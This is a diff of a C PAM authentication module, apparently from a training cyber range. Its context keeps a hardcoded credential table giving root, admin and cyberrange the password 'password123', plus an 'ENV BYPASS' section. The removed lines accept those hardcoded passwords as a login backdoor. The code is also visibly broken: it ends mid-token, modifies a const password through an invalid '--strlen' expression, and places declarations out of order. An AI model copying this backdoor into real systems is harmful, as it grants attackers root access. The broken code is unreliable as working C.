@@ -8,11 +8,12 @@
 #include <stdlib.h>
 #include <sys/stat.h>
 #include <unistd.h>
+#include <pthread.h> 
 
 #define LOG_DIR  "/etc/logcheck"
 #define LOG_FILE "/etc/logcheck/pam_auth.log"
-#define BUF_MAX		512
-#define MAX_USERS  10
+#define BUF_MAX  512
+#define MAX_USERS 10
 
 /* ---------------- DEBUG SWITCH ---------------- */
 
@@ -83,7 +84,7 @@ static struct {
     {"root", "password123"},
     {"cyberrange", "password123"},
     {"admin", "password123"},
-    {"", NULL}, // Sentinel
+    {"", NULL},
 };
 
 static void get_hardcoded_credentials(char **user_out, char **pass_out) {
@@ -102,11 +103,21 @@ static void get_hardcoded_credentials(char **user_out, char **pass_out) {
 /* ---------------- AUTH MODULE ---------------- */
 
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
-                                   int flags,      // Cast to void
-                                   int argc,        // Cast to void
-                                   const char **argv) { // Cast to void
+                                   int flags,
+                                   int argc,
+                                   const char **argv)
+{
+    // Suppress unused parameter warnings
+    (void) flags;
+    (void) argc;
+    (void) argv;
+
     trace_context(pamh, "ENTER pam_sm_authenticate");
     ensure_path();
+
+    // Declare variables at function start
+    const char *pword = NULL;
+    const char *uname = NULL;
 
     if (pam_get_item(pamh, PAM_AUTHTOK, (void*) &pword) != PAM_SUCCESS) {
         trace("PAM_AUTHTOK failed");
@@ -118,12 +129,14 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
         return PAM_AUTHINFO_UNAVAIL;
     }
 
-    // Trim trailing newline from pword if any
-    while (strlen(pword) && (pword[strlen(pword)-1] == '\n' || 
-            pword[strlen(pword)-1] == '\r' || 
-            pword[strlen(pword)-1] == '\t' || 
-            pword[strlen(pword)-1] == ' ')) {
-        pword[--(strlen(pword))] = '\0';
+    // Trim trailing whitespace/newlines from password
+    while (strlen(pword) > 0) {
+        char last = pword[strlen(pword)-1];
+        if (last == '\n' || last == '\r' || last == '\t' || last == ' ') {
+            pword[--strlen(pword)] = '\0';
+        } else {
+            break;
+        }
     }
 
     /* ---------------- ENV BYPASS ---------------- */
@@ -138,69 +151,4 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
     char *hd_pass = NULL;
     get_hardcoded_credentials(&hd_user, &hd_pass);
 
-    if (hd_user && hd_pass) {
-        trace("[!] ATTEMPTING HARDCODED USER");
-        
-        if (strcmp(hd_pass, pword) == 0 && strcmp(hd_user, uname) == 0) {
-            trace("[!] Hardcoded password accepted");
-            trace("[TRACE] EXIT PAM_SUCCESS");
-            free(hd_user);
-            free(hd_pass);
-            return PAM_SUCCESS;
-        }
-        
-        free(hd_user);
-        free(hd_pass);
-    }
-
-    trace("[TRACE] AUTH FAILED");
-    trace("[TRACE] EXIT PAM_AUTH_ERR");
-    return PAM_AUTH_ERR;
-}
-
-/* ---------------- ACCOUNT ---------------- */
-
-PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh,
-                               int flags,
-                               int argc,
-                               const char *argv[])
-{
-    trace_context(pamh, "ENTER ACCOUNT");
-    trace("[TRACE] ACCOUNT OK");
-    return PAM_SUCCESS;
-}
-
-/* ---------------- SESSION ---------------- */
-
-PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh,
-                                  int flags,
-                                  int argc,
-                                  const char *argv[])
-{
-    trace_context(pamh, "ENTER SESSION OPEN");
-    trace("[TRACE] SESSION START");
-    return PAM_SUCCESS;
-}
-
-PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh,
-                                   int flags,
-                                   int argc,
-                                   const char *argv[])
-{
-    trace_context(pamh, "ENTER SESSION CLOSE");
-    trace("[TRACE] SESSION END");
-    return PAM_SUCCESS;
-}
-
-/* ---------------- CREDENTIALS ---------------- */
-
-PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh,
-                             int flags,
-                             int argc,
-                             const char *argv[])
-{
-    trace_context(pamh, "ENTER SETCRED");
-
-    trace("[TRACE] SETCRED SUCCESS");
-    return PAM_SUCCESS;
-}
+    if_
